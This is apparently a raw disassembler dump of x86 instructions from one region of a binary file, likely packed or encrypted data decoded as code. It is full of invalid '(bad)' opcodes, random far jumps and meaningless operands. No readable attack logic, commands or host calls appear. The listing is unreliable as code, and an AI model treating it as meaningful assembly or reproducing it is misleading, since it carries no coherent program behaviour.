  418c31:	ror    BYTE PTR [ecx-0x71],1
  418c34:	jecxz  0x418bbf
  418c36:	or     al,0x39
  418c38:	push   ds
  418c39:	push   esi
  418c3a:	nop
  418c3b:	test   al,0x9b
  418c3d:	out    0xff,al
  418c3f:	sub    ebp,edx
  418c41:	bswap  ecx
  418c43:	(bad)  
  418c44:	in     al,0xd2
  418c46:	popa   
  418c47:	pop    edi
  418c48:	push   edx
  418c49:	sub    dl,cl
  418c4b:	inc    esp
  418c4c:	hlt    
  418c4d:	and    al,0xd3
  418c4f:	repnz test DWORD PTR [ebp+0x3f7f38cf],ebp
  418c56:	and    eax,0x2154780c
  418c5b:	fmul   DWORD PTR [edi+0xd]
  418c5e:	cwde   
  418c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c60:	ret    
  418c61:	lock cwde 
  418c63:	sbb    DWORD PTR [eax+0x16],eax
  418c66:	mov    al,ds:0xffdab075
  418c6b:	adc    al,0xe8
  418c6d:	mov    ds:0x76aa198d,eax
  418c72:	mov    eax,DWORD PTR [ebp+0x1135da3d]
  418c78:	mov    ds:0xd298c72a,al
  418c7d:	pop    ds
  418c7e:	inc    esp
  418c7f:	test   BYTE PTR [eax-0x14],cl
  418c82:	(bad)  
  418c83:	jl     0x418cf5
  418c85:	cmp    DWORD PTR [esi-0x1f],edi
  418c88:	ret    0x9560
  418c8b:	stc    
  418c8c:	and    BYTE PTR [esi],ch
  418c8e:	mov    ch,0x5a
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	shr    BYTE PTR [edx],cl
  418d01:	into   
  418d02:	cwde   
  418d03:	sahf   
  418d04:	lods   al,BYTE PTR ds:[esi]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	mov    ds:0xf0fdf723,eax
  418d11:	add    al,0x9f
  418d13:	sahf   
  418d14:	in     eax,0xbe
  418d16:	push   edi
  418d17:	xor    ax,0x42d0
  418d1b:	stos   BYTE PTR es:[edi],al
  418d1c:	dec    ebp
  418d1d:	sub    BYTE PTR [esi],cl
  418d1f:	adc    al,0x6c
  418d21:	xor    eax,0xb58844a
  418d26:	es push ss
  418d28:	(bad)  
  418d29:	clc    
  418d2a:	add    dl,BYTE PTR [edi-0x40]
  418d2d:	cmp    eax,0xea492fc3
  418d32:	fadd   st,st(1)
  418d34:	sub    eax,0x93099330
  418d39:	mov    BYTE PTR ds:0xc18eefe0,al
  418d3f:	sub    edx,ebx
  418d41:	hlt    
  418d42:	inc    esi
  418d43:	inc    ebx
  418d44:	mov    esp,eax
  418d46:	retf   
  418d47:	jecxz  0x418da3
  418d49:	hlt    
  418d4a:	inc    ecx
  418d4b:	rcr    DWORD PTR [esi+0x0],1
  418d4e:	test   DWORD PTR [ebx-0x74],edx
  418d51:	jmp    0xa0c5:0x30eab81d
  418d58:	pop    esp
  418d59:	test   al,0xf9
  418d5b:	cmp    DWORD PTR [ebp-0x11e6e1b2],esi
  418d61:	jle    0x418dd6
  418d63:	sbb    ah,BYTE PTR ds:0xd5753710
  418d69:	push   0xffffffe1
  418d6b:	and    edi,ebp
  418d6d:	xor    eax,0x67e48970
  418d72:	or     ecx,edx
  418d74:	sbb    BYTE PTR [eax+ecx*1],0x4
  418d78:	shl    BYTE PTR [edi],cl
  418d7a:	cmp    esi,0xa3d373ae
  418d80:	test   eax,0x3aadeeef
  418d85:	sti    
  418d86:	sbb    edi,DWORD PTR [ebp+0x445b56f7]
  418d8c:	sbb    al,0x7d
  418d8e:	jp     0x418d56
  418d90:	lds    esi,FWORD PTR [edi]
  418d92:	mov    ds,WORD PTR ds:0xbd9cc2f2
  418d98:	pop    edx
  418d99:	sub    esp,DWORD PTR [ebx+0x2bb549f4]
  418d9f:	mov    cl,al
  418da1:	test   eax,0x80928222
  418da6:	push   edi
  418da7:	sbb    ebx,eax
  418da9:	test   BYTE PTR [eax-0xe],bh
  418dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dad:	jno    0x418d77
  418daf:	idiv   BYTE PTR [ecx-0x1d]
  418db2:	pop    esp
  418db3:	push   ebx
  418db4:	enter  0x5c84,0x69
  418db8:	pop    edx
  418db9:	iret   
  418dba:	add    BYTE PTR [eax+0x47],0x27
  418dbe:	shl    BYTE PTR [edx],1
  418dc0:	sbb    al,0x4
  418dc2:	shl    DWORD PTR [esi+0x4f],1
  418dc5:	push   ss
  418dc6:	push   eax
  418dc7:	push   ebx
  418dc8:	fwait
  418dc9:	mov    cl,al
  418dcb:	or     dh,BYTE PTR [esi+0x33]
  418dce:	or     DWORD PTR [eax+0x67],eax
  418dd1:	pop    edi
  418dd2:	xor    BYTE PTR ds:0x226ee175,dl
  418dd8:	pop    edx
  418dd9:	test   DWORD PTR [edx+esi*8],esp
  418ddc:	cwde   
  418ddd:	retf   
  418dde:	jo     0x418ddc
  418de0:	and    dh,BYTE PTR [ecx+0x47ee2712]
  418de6:	cmp    DWORD PTR [edi+esi*8],eax
  418de9:	out    0x5e,eax
  418deb:	adc    BYTE PTR [eax],ah
  418ded:	imul   ebp,DWORD PTR [edx-0x2f],0xffffffa4
  418df1:	mov    ecx,0xdb333b33
  418df6:	cmp    al,0xc6
  418df8:	retf   0x22fb
  418dfb:	sbb    DWORD PTR [edi-0x17],esi
  418dfe:	or     edi,esp
  418e00:	test   ebp,0x651cea34
  418e06:	adc    BYTE PTR [edi],bl
  418e08:	adc    al,0xd7
  418e0a:	add    BYTE PTR [eax-0x14],cl
  418e0d:	xchg   BYTE PTR [ebp+0x10],dh
	...
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x6f]
  418e81:	out    0x45,al
  418e83:	adc    al,0xb0
  418e85:	pop    es
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	push   ebx
  418e8d:	out    0x81,eax
  418e8f:	dec    eax
  418e90:	lods   eax,DWORD PTR ds:[esi]
  418e91:	xor    DWORD PTR [ebx+0x8],ecx
  418e94:	es (bad) 
  418e96:	ja     0x418e79
  418e98:	data16 add BYTE PTR [ecx-0xe],0xa
  418e9d:	pop    edx
  418e9e:	bound  ebp,QWORD PTR [esi]
  418ea0:	or     dh,bl
  418ea2:	int    0xb9
  418ea4:	(bad)
  418ea7:	xchg   esp,eax
  418ea8:	retf   
  418ea9:	pop    edi
  418eaa:	bswap  ecx
  418eac:	fdivr  st(5),st
  418eae:	jno    0x418edd
  418eb0:	in     al,dx
  418eb1:	aas    
  418eb2:	pop    ds
  418eb3:	pop    ss
  418eb4:	add    BYTE PTR [eax+0x29070c2b],dh
  418eba:	call   0x63133f1f
  418ebf:	shl    DWORD PTR [ecx-0xd338a99],cl
  418ec5:	inc    ebp
  418ec6:	aam    0x13
  418ec8:	addr16 push es
  418eca:	push   ds
  418ecb:	and    esi,DWORD PTR [edx-0x61]
  418ece:	aad    0x74
  418ed0:	call   0xef07:0x3ca14049
  418ed7:	mov    ds:0xdd6873b3,al
  418edc:	or     eax,0xd2147613
  418ee1:	cmp    DWORD PTR [ebp+0x39],eax
  418ee4:	(bad)  
  418ee5:	cmp    eax,0xc21c6bb2
  418eea:	je     0x418f5a
  418eec:	icebp  
  418eed:	jnp    0x418f2a
  418eef:	add    esp,DWORD PTR [ecx+edx*8+0x54013fcc]
  418ef6:	mov    ebx,0x47966a9b
  418efb:	mov    al,0x4c
  418efd:	xor    edi,DWORD PTR [ebp+0x49b23d18]
  418f03:	sbb    DWORD PTR [esp],esp
  418f06:	aad    0xbf
  418f08:	adc    ebp,DWORD PTR [esi-0x9fff623]
  418f0e:	mov    ebx,0x7cc78f9a
  418f13:	pushf  
  418f14:	jge    0x418ef7
  418f16:	out    0xeb,eax
  418f18:	xor    eax,0xd28df2b7
  418f1d:	dec    eax
  418f1e:	jns    0x418ed1
  418f20:	test   eax,0x3162d327
  418f25:	inc    edi
  418f26:	sar    DWORD PTR [esp+edi*2-0x41723023],1
  418f2d:	and    bh,BYTE PTR [ecx+edi*4+0x7a]
  418f31:	pop    ecx
  418f32:	pop    ss
  418f33:	retf   0x97b7
  418f36:	jnp    0x418edb
  418f38:	loope  0x418f5a
  418f3a:	fstp   TBYTE PTR [ebx+ecx*4+0x25]
  418f3e:	icebp  
  418f3f:	retf   
  418f40:	and    ebp,DWORD PTR [esi+0xb50776]
  418f46:	inc    ecx
  418f47:	mov    eax,ds:0xe797154b
  418f4c:	enter  0xff5c,0xb1
  418f50:	in     al,dx
  418f51:	xor    al,0x31
  418f53:	test   al,0x78
  418f55:	push   ds
  418f56:	sub    BYTE PTR [ebp+0x5268d37],bl
  418f5c:	and    DWORD PTR [eax-0x1ced17eb],eax
  418f62:	pop    ebp
  418f63:	popa   
  418f64:	stc    
  418f65:	push   0x62b92f80
  418f6a:	mov    ds:0x30d009cc,al
  418f6f:	sub    BYTE PTR [edi],bh
  418f71:	sbb    eax,0xda946872
  418f76:	or     eax,0x4ac72d75
  418f7b:	jne    0x418f10
  418f7d:	cmp    eax,0xde73baf2
  418f82:	js     0x418fc1
  418f84:	daa    
  418f85:	dec    eax
  418f86:	push   0xffffffec
  418f88:	dec    esp
  418f89:	add    al,0xd0
  418f8b:	fmul   st,st(2)
  418f8d:	add    DWORD PTR [eax+0xa2],eax
	...
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x15150e59]
  419001:	sti    
  419002:	jmp    0x400:0x108b41d
  419009:	add    DWORD PTR [eax],eax
  41900b:	add    BYTE PTR [edx],ah
  41900d:	mov    bh,0xea
  41900f:	sub    dh,dh
  419011:	lods   eax,DWORD PTR ds:[esi]
  419012:	pop    es
  419013:	mov    ds:0x461d58f2,al
  419018:	sbb    BYTE PTR [ecx],ah
  41901a:	push   0x71ee843c
  41901f:	in     al,dx
  419020:	jmp    0x419097
  419022:	add    al,0xaf
  419024:	cwde   
  419025:	in     eax,0x5a
  419027:	stos   BYTE PTR es:[edi],al
  419028:	push   cs
  419029:	inc    ebx
  41902a:	shl    BYTE PTR [edx],cl
  41902c:	cmc    
  41902d:	arpl   WORD PTR [ebp-0x1432aef5],dx
  419033:	mov    ebx,0x95d8b56e
  419038:	sbb    eax,0x8ffcf4b6
  41903d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41903e:	mov    eax,0x263b5f20
  419043:	adc    bh,BYTE PTR [ecx+0x62b685a9]
  419049:	ret    
  41904a:	push   esp
  41904b:	stos   DWORD PTR es:[edi],eax
  41904c:	push   edi
  41904d:	inc    esi
  41904e:	in     eax,dx
  41904f:	cdq    
  419050:	imul   edx,DWORD PTR [edx+0x39a57875],0x2d7da97d
  41905a:	jg     0x419009
  41905c:	push   0xa246abf2
  419061:	pop    ecx
  419062:	icebp  
  419063:	push   esp
  419064:	add    cl,BYTE PTR [ebp-0x292774fc]
  41906a:	adc    cl,BYTE PTR [eax-0x12661ff8]
  419070:	sub    DWORD PTR [eax+0x6427c44e],esi
  419076:	sbb    BYTE PTR [ebx],bl
  419078:	retf   0x56ad
  41907b:	xchg   edx,eax
  41907c:	popa   
  41907d:	loopne 0x4190bc
  41907f:	lea    ebx,[ebx]
  419081:	adc    BYTE PTR [ecx+0x4918a6f5],cl
  419087:	das    
  419088:	in     eax,dx
  419089:	mov    DWORD PTR [edi+0x54],eax
  41908c:	and    DWORD PTR [ebx+0x72],ecx
  41908f:	repz leave 
  419091:	test   al,0xe4
  419093:	sbb    al,0x54
  419095:	ror    edi,0xa
  419098:	pop    edi
  419099:	xchg   edx,eax
  41909a:	das    
  41909b:	cs jne 0x41909b
  41909e:	inc    ecx
  41909f:	sbb    eax,0x22d761b3
  4190a4:	mov    bh,0xf0
  4190a6:	xchg   BYTE PTR [ebx],al
  4190a8:	inc    ecx
  4190a9:	adc    eax,0x26da1e54
  4190ae:	push   ds
  4190af:	jge    0x419040
  4190b1:	stos   BYTE PTR es:[edi],al
  4190b2:	frstor [edx-0x67]
  4190b5:	fdiv   DWORD PTR [ebx]
  4190b7:	push   0xb4cec288
  4190bc:	leave  
  4190bd:	rcr    DWORD PTR [edx],cl
  4190bf:	jb     0x4190a9
  4190c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c2:	mov    esp,0xc6424acb
  4190c7:	imul   esp,ebx,0xffffffca
  4190ca:	or     ebx,DWORD PTR [edx]
  4190cc:	xchg   esp,eax
  4190cd:	neg    BYTE PTR [esi-0xe]
  4190d0:	test   BYTE PTR [ebx],bh
  4190d2:	adc    bh,0x5d
  4190d5:	mov    ch,bl
  4190d7:	adc    eax,0xb503d4bf
  4190dc:	sbb    al,0xea
  4190de:	pop    es
  4190df:	jmp    0x419086
  4190e1:	sbb    eax,0x1a41df75
  4190e6:	and    ebx,ebx
  4190e8:	shl    BYTE PTR [esi+0x50932900],cl
  4190ee:	jbe    0x419088
  4190f0:	push   edi
  4190f1:	stos   BYTE PTR es:[edi],al
  4190f2:	inc    esi
  4190f3:	and    BYTE PTR [edi-0x4d],0x4e
  4190f7:	push   esi
  4190f8:	dec    edi
  4190f9:	int    0xe5
  4190fb:	mov    bl,0xc9
  4190fd:	retf   
  4190fe:	fimul  WORD PTR [ecx-0x6]
  419101:	xchg   esp,eax
  419102:	mov    ds,WORD PTR [edi+0x15]
  419105:	xor    DWORD PTR [ebp-0x24],ebp
  419108:	xor    DWORD PTR [ebp-0x42],esp
  41910b:	shl    DWORD PTR [edi],0x1b
  41910e:	out    dx,al
  41910f:	sub    DWORD PTR [eax],eax
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dh,BYTE PTR [ecx]
  419181:	and    al,0x40
  419183:	push   edi
  419184:	mov    eax,0x4000109
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    BYTE PTR [edi],dl
  41918d:	scas   al,BYTE PTR es:[edi]
  41918e:	aam    0x29
  419190:	es popa 
  419192:	xor    BYTE PTR ds:0xad08f650,ah
  419198:	pop    eax
  419199:	jg     0x4191bf
  41919b:	lods   al,BYTE PTR ds:[esi]
  41919c:	mov    esi,0xd713d61c
  4191a1:	fcmovbe st,st(2)
  4191a3:	xor    edx,edi
  4191a5:	or     al,0x93
  4191a7:	stos   DWORD PTR es:[edi],eax
  4191a8:	adc    eax,0x838f778e
  4191ae:	xchg   esp,eax
  4191af:	jmp    0x419137
  4191b1:	scas   eax,DWORD PTR es:[edi]
  4191b2:	adc    ebp,edx
  4191b4:	aaa    
  4191b5:	cmp    dl,BYTE PTR [esi]
  4191b7:	ror    DWORD PTR [eax-0x5b586aec],1
  4191bd:	ficom  DWORD PTR [edi+0x7d42a599]
  4191c3:	(bad)  
  4191c4:	and    ch,ah
  4191c6:	rol    edi,cl
  4191c8:	mov    bl,0xf9
  4191ca:	pop    esi
  4191cb:	loopne 0x419188
  4191cd:	bound  esi,QWORD PTR [esi]
  4191cf:	sbb    BYTE PTR [ecx],cl
  4191d1:	lock sbb eax,edx
  4191d4:	test   BYTE PTR [edx],dl
  4191d6:	lea    sp,[ecx-0x3e]
  4191da:	retf   0xe274
  4191dd:	jns    0x41921f
  4191df:	mov    BYTE PTR [esi-0x2dea3159],cl
  4191e5:	sub    DWORD PTR [edx],0xffffff83
  4191e8:	rcl    DWORD PTR [eax],cl
  4191ea:	sbb    al,0xe0
  4191ec:	push   ds
  4191ed:	fst    QWORD PTR [eax+0x5b3e2dbb]
  4191f3:	xchg   esi,eax
  4191f4:	pop    ebp
  4191f5:	mov    ebp,0x83c64558
  4191fa:	dec    esi
  4191fb:	jns    0x4191a4
  4191fd:	add    eax,0x30aed46b
  419202:	jmp    0x419274
  419204:	inc    edx
  419205:	repnz mov al,ds:0x3fe17f6a
  41920b:	add    ecx,DWORD PTR [ecx+0x1a]
  41920e:	test   DWORD PTR [edx],0x9cfa1dd1
  419214:	scas   eax,DWORD PTR es:[edi]
  419215:	or     DWORD PTR [eax],ebx
  419217:	sub    DWORD PTR [ebp-0x5ef67102],edx
  41921d:	div    DWORD PTR [edx+0x64]
  419220:	mov    cl,0xe8
  419222:	ss out dx,al
  419224:	(bad)  
  419225:	adc    ebp,esi
  419227:	jecxz  0x4192a0
  419229:	mov    ah,0x4b
  41922b:	test   DWORD PTR [ecx-0x3ce5b386],edi
  419231:	(bad)  
  419232:	mov    bl,0x35
  419234:	pop    esp
  419235:	adc    BYTE PTR [ecx+0x77],dl
  419238:	lods   eax,DWORD PTR ds:[esi]
  419239:	sbb    eax,0x7e0efa98
  41923e:	sbb    BYTE PTR [esi-0x51],al
  419241:	(bad)  
  419242:	xor    eax,0xc364277a
  419247:	xchg   ebp,eax
  419248:	mov    dh,BYTE PTR [ebp+0x25]
  41924b:	push   edi
  41924c:	sbb    BYTE PTR [ebp+0x3b],ch
  41924f:	outs   dx,BYTE PTR ds:[esi]
  419250:	(bad)  [ebx+0x39]
  419253:	cmp    eax,edi
  419255:	aam    0xd2
  419257:	ss enter 0x96bd,0x32
  41925c:	pop    esp
  41925d:	mov    ebx,0x3d5c8faa
  419262:	push   esi
  419263:	into   
  419264:	mov    ecx,0xfcedcf5d
  419269:	call   0xf37c:0x5d88ae22
  419270:	inc    ecx
  419271:	sti    
  419272:	jmp    0xbcf946d2
  419277:	out    dx,al
  419278:	push   esp
  419279:	and    edi,DWORD PTR [ebx+0x5a4b113a]
  41927f:	fimul  WORD PTR [edi+edx*4-0x5aed2482]
  419286:	mov    ds:0xb973efe4,al
  41928b:	inc    esi
  41928c:	jb     0x4192c7
  41928e:	sar    DWORD PTR [eax+eax*1+0x0],0x0
	...
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	das    
  419301:	mov    bl,0x31
  419303:	cmp    eax,0x10abc
  419308:	add    al,0x1
  41930a:	add    BYTE PTR [eax],al
  41930c:	xchg   edx,eax
  41930d:	aam    0xe4
  41930f:	cmp    al,BYTE PTR [eax+0x3dcfcc03]
  419315:	xlat   BYTE PTR ds:[ebx]
  419316:	mov    bh,dl
  419318:	test   DWORD PTR [edi-0x561f6247],esi
  41931e:	add    al,0x17
  419320:	hlt    
  419321:	pop    eax
  419322:	fnstcw WORD PTR [ecx+esi*4]
  419325:	out    0xe9,eax
  419327:	pushf  
  419328:	pop    edi
  419329:	and    esi,edi
  41932b:	xchg   ebx,eax
  41932c:	jl     0x41935e
  41932e:	lea    edi,[ebx+edx*8+0x5a3e5c26]
  419335:	jne    0x419302
  419337:	fsubp  st(4),st
  419339:	aad    0xdd
  41933b:	enter  0xef49,0xf4
  41933f:	mov    al,BYTE PTR [ecx+0x34abedd8]
  419345:	and    bl,bl
  419347:	cdq    
  419348:	inc    ebx
  419349:	dec    ebx
  41934a:	hlt    
  41934b:	pop    ebp
  41934c:	gs addr16 dec ebx
  41934f:	lds    esi,FWORD PTR [eax+edx*4+0x7ef4df40]
  419356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419357:	sar    BYTE PTR [edi],cl
  419359:	mov    cl,0xdf
  41935b:	mov    bl,0x46
  41935d:	cmp    ebx,DWORD PTR [bx+di]
  419360:	fisubr DWORD PTR [ebp+0x5968d1f9]
  419366:	outs   dx,BYTE PTR ds:[esi]
  419367:	dec    eax
  419368:	push   edx
  419369:	dec    ebx
  41936a:	dec    ecx
  41936b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41936c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41936d:	xlat   BYTE PTR ds:[ebx]
  41936e:	aam    0x92
  419370:	pop    ds
  419371:	sar    cl,0xf3
  419374:	ja     0x4193a5
  419376:	jno    0x419335
  419378:	push   ss
  419379:	xor    cl,cl
  41937b:	js     0x419340
  41937d:	jne    0x419399
  41937f:	sbb    edx,DWORD PTR [ebp-0x6efbc6f5]
  419385:	(bad)  
  419386:	jmp    0x6453:0xd947ba66
  41938d:	cmp    DWORD PTR [esi+0x31db1090],ebp
  419393:	ins    DWORD PTR es:[edi],dx
  419394:	lea    ebx,[edx+0x39d83e56]
  41939a:	add    edi,ecx
  41939c:	sbb    edi,esp
  41939e:	dec    esi
  41939f:	mov    cl,0x41
  4193a1:	fs push 0x298832bc
  4193a7:	test   ecx,0xbc33e2bc
  4193ad:	adc    BYTE PTR [edx],0x8f
  4193b0:	xchg   edx,eax
  4193b1:	dec    esp
  4193b2:	xor    al,BYTE PTR [edi+edx*2]
  4193b5:	test   bl,al
  4193b7:	jmp    0xaef7e33c
  4193bc:	daa    
  4193bd:	nop
  4193be:	das    
  4193bf:	std    
  4193c0:	jg     0x41938e
  4193c2:	push   0x443c2f02
  4193c7:	pusha  
  4193c8:	loope  0x4193e4
  4193ca:	mov    dh,0x8b
  4193cc:	or     eax,0xbf979abf
  4193d1:	test   DWORD PTR [esi+eiz*4],eax
  4193d4:	(bad)  
  4193d5:	xlat   BYTE PTR ds:[ebx]
  4193d6:	sub    bl,BYTE PTR [eax+0x689c343]
  4193dc:	sub    bl,ch
  4193de:	xchg   DWORD PTR [ecx-0x5e],edi
  4193e1:	mov    BYTE PTR [edx+0x8],ah
  4193e4:	or     cl,BYTE PTR [ebp-0x513b9521]
  4193ea:	cmp    eax,0xef02c398
  4193ef:	test   DWORD PTR [edx+0x51],ebx
  4193f2:	push   esi
  4193f3:	push   edi
  4193f4:	mov    bh,ah
  4193f6:	std    
  4193f7:	mov    ebp,0xc9c155c
  4193fc:	std    
  4193fd:	fmul   DWORD PTR [ecx+0x7ec7fba2]
  419403:	lahf   
  419404:	stos   BYTE PTR es:[edi],al
  419405:	cmp    al,0x8c
  419407:	cmp    esp,ebp
  419409:	dec    ebp
  41940a:	jne    0x4193d7
  41940c:	pusha  
  41940d:	mov    ecx,0x5bff
	...
  419472:	add    BYTE PTR [eax],al
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	out    dx,al
  419481:	jmp    0x4194c7
  419483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419484:	ror    BYTE PTR [ebx],0x1
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41948d:	dec    DWORD PTR [edi+ebp*2]
  419490:	loope  0x419466
  419492:	cmp    ebp,DWORD PTR [edi+0x1e53ca78]
  419498:	jmp    0x3d4e:0x2b367330
  41949f:	(bad)  
  4194a0:	aad    0xb6
  4194a2:	mov    esi,0x152a7e99
  4194a7:	dec    eax
  4194a8:	out    0xd8,eax
  4194aa:	jb     0x4194b4
  4194ac:	xor    dl,BYTE PTR [edx+0x10]
  4194af:	sti    
  4194b0:	gs dec ebp
  4194b2:	(bad)  
  4194b4:	aas    
  4194b5:	js     0x41944c
  4194b7:	cmp    edi,edx
  4194b9:	in     al,dx
  4194ba:	aas    
  4194bb:	inc    esi
  4194bc:	xor    esp,DWORD PTR cs:[edx]
  4194bf:	or     edi,ebx
  4194c1:	jp     0x4194ee
  4194c3:	xchg   esp,eax
  4194c4:	(bad)  
  4194c6:	aaa    
  4194c7:	popa   
  4194c8:	int    0xcd
  4194ca:	rcl    DWORD PTR [esi+edx*1-0x62],cl
  4194ce:	out    dx,eax
  4194cf:	fdivr  QWORD PTR [edi-0x258d5950]
  4194d5:	sub    dh,ch
  4194d7:	loope  0x419518
  4194d9:	pushf  
  4194da:	repz add ch,BYTE PTR [esi-0x25c56f95]
  4194e1:	mov    ah,0x33
  4194e3:	dec    ebx
  4194e4:	add    esp,DWORD PTR [edx-0x197bcb69]
  4194ea:	stos   BYTE PTR es:[edi],al
  4194eb:	and    edx,DWORD PTR [ebx-0x2a07a050]
  4194f1:	repz mov bh,0xb6
  4194f4:	lods   al,BYTE PTR ds:[esi]
  4194f5:	mov    dl,0x42
  4194f7:	aaa    
  4194f8:	int    0x6b
  4194fa:	fisub  DWORD PTR [edx-0x107544ce]
  419500:	lea    eax,[edi]
  419502:	inc    esi
  419503:	xchg   ecx,eax
  419504:	mov    esi,0xf95e18fa
  419509:	dec    edx
  41950a:	std    
  41950b:	or     bh,dh
  41950d:	pushf  
  41950e:	mov    cl,0xf3
  419510:	aad    0x9f
  419512:	mov    ebx,0x54176ba9
  419517:	out    0x5c,al
  419519:	inc    ecx
  41951a:	fstp   DWORD PTR [esi]
  41951c:	loope  0x419513
  41951e:	js     0x41950f
  419520:	(bad)  
  419521:	adc    BYTE PTR [edi+0x35b7d7c4],bl
  419527:	mov    al,0x7b
  419529:	idiv   DWORD PTR [eax+0x21]
  41952c:	icebp  
  41952d:	stos   DWORD PTR es:[edi],eax
  41952e:	mov    ebx,0x1d62f97a
  419533:	js     0x4195b4
  419535:	mov    ds:0xd72ec4cd,eax
  41953a:	cmp    DWORD PTR [edi+0x1c],eax
  41953d:	jmp    FWORD PTR [ecx]
  41953f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419540:	fsub   st(3),st
  419542:	mov    edx,0x735c083c
  419547:	inc    ecx
  419548:	dec    ebp
  419549:	stos   BYTE PTR es:[edi],al
  41954a:	ja     0x4194dc
  41954c:	pop    esi
  41954d:	outs   dx,DWORD PTR ds:[esi]
  41954e:	out    dx,al
  41954f:	adc    DWORD PTR [eax-0x43],ebx
  419552:	outs   dx,BYTE PTR ds:[esi]
  419553:	xchg   esp,eax
  419554:	or     al,0x56
  419556:	and    al,0x63
  419558:	icebp  
  419559:	scas   eax,DWORD PTR es:[edi]
  41955a:	adc    esi,DWORD PTR [esp+ecx*8+0x37673acb]
  419561:	popa   
  419562:	shl    edx,cl
  419564:	mov    ch,0xb5
  419566:	add    BYTE PTR [edi],bh
  419568:	test   DWORD PTR [esi+0x70],eax
  41956b:	not    BYTE PTR [ebx+0x11]
  41956e:	into   
  41956f:	pushf  
  419570:	adc    BYTE PTR [edi+0x20],dh
  419573:	rcr    bh,0x5b
  419576:	mov    ebx,0x2c04a0ef
  41957b:	fcomp  QWORD PTR ds:0x74382ea3
  419581:	mov    bl,0xc8
  419583:	icebp  
  419584:	pop    edi
  419585:	js     0x4195aa
  419587:	jnp    0x419570
  419589:	aad    0xfb
  41958b:	std    
  41958c:	ins    DWORD PTR es:[edi],dx
  41958d:	loop   0x41954c
  41958f:	push   0x0
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	dec    ebx
  419601:	loopne 0x419593
  419603:	popa   
  419604:	les    ecx,FWORD PTR [ecx+eax*1]
  419607:	add    BYTE PTR [ecx+eax*1],al
  41960a:	add    BYTE PTR [eax],al
  41960c:	push   esp
  41960d:	(bad)  
  41960e:	aas    
  41960f:	retf   0x285c
  419612:	jbe    0x41963d
  419614:	dec    edx
  419615:	stc    
  419616:	inc    esp
  419617:	les    ebp,FWORD PTR [ecx+eiz*1-0x2f]
  41961b:	jp     0x4195c0
  41961d:	outs   dx,DWORD PTR ds:[esi]
  41961e:	or     cl,bl
  419620:	inc    edx
  419621:	xchg   esi,eax
  419622:	(bad)  
  419623:	icebp  
  419624:	adc    cl,ch
  419626:	cmp    DWORD PTR ds:0x31a7688,0x54
  41962d:	push   es
  41962e:	push   edx
  41962f:	sbb    DWORD PTR [ebx],ebx
  419631:	ret    
  419632:	push   ebx
  419633:	jb     0x4195d2
  419635:	adc    BYTE PTR [esi+0x75],0x2e
  419639:	(bad)  
  41963a:	jp     0x419620
  41963c:	jecxz  0x419630
  41963e:	je     0x41960f
  419640:	lea    ebx,[eax]
  419642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419643:	in     al,0x14
  419645:	outs   dx,DWORD PTR ds:[esi]
  419646:	cmp    edi,ebx
  419648:	dec    ebp
  419649:	dec    eax
  41964a:	repz popf 
  41964c:	aam    0x83
  41964e:	mov    ebx,0xdb26f4f3
  419653:	sbb    dh,dh
  419655:	rcl    DWORD PTR [edi+0x7f9da0c4],cl
  41965b:	jg     0x4196b6
  41965d:	pop    esp
  41965e:	ds cmp dl,cl
  419661:	xchg   esi,eax
  419662:	repz mov bl,0xd4
  419665:	mov    al,ds:0x67097bce
  41966a:	push   ebx
  41966b:	jnp    0x4196b2
  41966d:	loopne 0x419610
  41966f:	sar    dh,0x92
  419672:	dec    esi
  419673:	addr16 pop ebp
  419675:	addr16 jmp 0x1fcbc256
  41967b:	inc    ecx
  41967c:	in     eax,0x1e
  41967e:	ror    ebp,1
  419680:	(bad)  
  419681:	dec    ecx
  419682:	mov    WORD PTR [ecx+0x7b],ss
  419685:	leave  
  419686:	fs xchg ebx,eax
  419688:	jecxz  0x419640
  41968a:	cmp    cl,BYTE PTR [esi]
  41968c:	rcl    DWORD PTR ds:0x84cba7ec,cl
  419692:	in     al,dx
  419693:	popa   
  419694:	inc    ebp
  419695:	push   esp
  419696:	jmp    0xdd21:0x259a62b8
  41969d:	mov    ds:0xe7a8ab9e,eax
